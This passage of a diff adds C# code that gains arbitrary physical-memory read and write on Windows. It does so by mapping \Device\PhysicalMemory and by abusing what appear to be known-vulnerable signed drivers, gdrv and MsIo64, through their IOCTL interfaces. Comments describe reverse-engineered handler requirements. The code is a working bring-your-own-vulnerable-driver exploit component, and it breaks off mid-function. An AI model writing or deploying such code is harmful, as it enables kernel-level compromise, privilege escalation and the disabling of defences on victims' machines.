@@ -1,0 +1,105 @@
+    public static string SweepRead(IntPtr g, ulong from, ulong to, ulong step, out string rep)
+    {
+        rep = "";
+        int okCount = 0, failCount = 0;
+        ulong firstFail = 0, lastOk = 0, lastFail = 0;
+        for (ulong pa = from; pa < to; pa += step)
+        {
+            try { RdD(g, pa); okCount++; lastOk = pa; }
+            catch (Exception)
+            {
+                failCount++; if (firstFail == 0) firstFail = pa; lastFail = pa;
+                if (failCount <= 6) rep += string.Format("  fail pa=0x{0:x}\r\n", pa);
+            }
+        }
+        rep += string.Format("  ok={0} fail={1} firstFail=0x{2:x} lastOk=0x{3:x} lastFail=0x{4:x}\r\n",
+                             okCount, failCount, firstFail, lastOk, lastFail);
+        return okCount.ToString();
+    }
+
+
+    public static ulong RdQ(IntPtr h, ulong pa) { return BitConverter.ToUInt64(GdrvRead(h, pa, 8), 0); }
+    public static uint RdD(IntPtr h, ulong pa) { return BitConverter.ToUInt32(GdrvRead(h, pa, 4), 0); }
+
+    public static string Hex(byte[] b)
+    {
+        StringBuilder sb = new StringBuilder(b.Length * 3);
+        for (int i = 0; i < b.Length; i++) { sb.Append(b[i].ToString("x2")); if (i + 1 < b.Length) sb.Append(' '); }
+        return sb.ToString();
+    }
+    // ---- W1: physical R/W through \Device\PhysicalMemory (native) ----------
+    public static string PhysMemOpen(out IntPtr section)
+    {
+        section = IntPtr.Zero;
+        string p1 = EnablePriv("SeLockMemoryPrivilege");
+        string nm = @"\Device\PhysicalMemory";
+        IntPtr nameBuf = Marshal.StringToHGlobalUni(nm);
+        IntPtr usBuf = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UNICODE_STRING)));
+        try
+        {
+            UNICODE_STRING us = new UNICODE_STRING();
+            us.Length = (ushort)(nm.Length * 2);
+            us.MaxLen = (ushort)((nm.Length + 1) * 2);
+            us.Buffer = nameBuf;
+            Marshal.StructureToPtr(us, usBuf, false);
+            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
+            oa.Length = (uint)Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES));
+            oa.Name = usBuf;
+            oa.Attributes = OBJ_CASE_INSENSITIVE;
+            IntPtr s;
+            int st = NtOpenSection(out s, SECTION_MAP_READ | SECTION_MAP_WRITE, ref oa);
+            if (st < 0) return string.Format("priv={0} NtOpenSection=0x{1:x8}", p1, st);
+            section = s;
+            return string.Format("priv={0} NtOpenSection=ok handle=0x{1:x}", p1, s.ToInt64());
+        }
+        finally
+        {
+            Marshal.FreeHGlobal(nameBuf);
+            Marshal.FreeHGlobal(usBuf);
+        }
+    }
+
+    public static string PhysMemMap(IntPtr section, ulong pa, uint size, bool nocache,
+                                    out IntPtr view, out long viewSize)
+    {
+        view = IntPtr.Zero; viewSize = size;
+        IntPtr b; long off = (long)pa; IntPtr vs;
+        int st = NtMapViewOfSection(section, new IntPtr(-1), out b, IntPtr.Zero, IntPtr.Zero,
+                                    ref off, out vs, 1, 0,
+                                    PAGE_READWRITE | (nocache ? PAGE_NOCACHE : 0));
+        if (st < 0) return string.Format("NtMapViewOfSection pa=0x{0:x} st=0x{1:x8}", pa, st);
+        view = b; viewSize = vs.ToInt64();
+        return "";
+    }
+
+    public static string PhysMemUnmap(IntPtr section, IntPtr view)
+    {
+        int st = NtUnmapViewOfSection(new IntPtr(-1), view);
+        if (section != IntPtr.Zero) NtClose(section);
+        return st < 0 ? string.Format("0x{0:x8}", st) : "";
+    }
+
+    // ---- W2: MsIo64 0x80102040 map / 0x80102044 unmap -----------------------
+    public static string MsIoOpen(out IntPtr h)
+    {
+        h = CreateFileW(@"\\.\MSIO", GENERIC_READ | GENERIC_WRITE, 0, IntPtr.Zero,
+                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
+        if (h.ToInt64() == INVALID_HANDLE) return "err=" + Marshal.GetLastWin32Error();
+        return "";
+    }
+
+    // The 0x80102044 handler in MsIo64.sys (temp\drv\msio_1500.txt 0x156b)
+    // requires InputBufferLength==0x28 and hands q[2] to the unmap worker as
+    // the section handle, q[3] as the view base -> the map reply must carry
+    // both in the SAME 5-qword buffer.
+    public static string MsIoTry(IntPtr h, int shape, ulong pa, uint size,
+                                 out uint err, out string outHex)
+    {
+        err = 0; outHex = "";
+        int inLen = shape == 2 ? 0x18 : (shape == 3 ? 0x30 : 0x28);
+        IntPtr inb = Marshal.AllocHGlobal(0x40);
+        IntPtr outb = Marshal.AllocHGlobal(0x40);
+        try
+        {
+            for (int i = 0; i < 0x40; i++) { Marshal.WriteByte(inb, i, 0); Marshal.WriteByte(outb, i, 0); }
+            if (shape == 1) { Marshal.WriteInt64(inb, 0, size); Marshal.WriteInt64(inb, 8, (long)pa); }
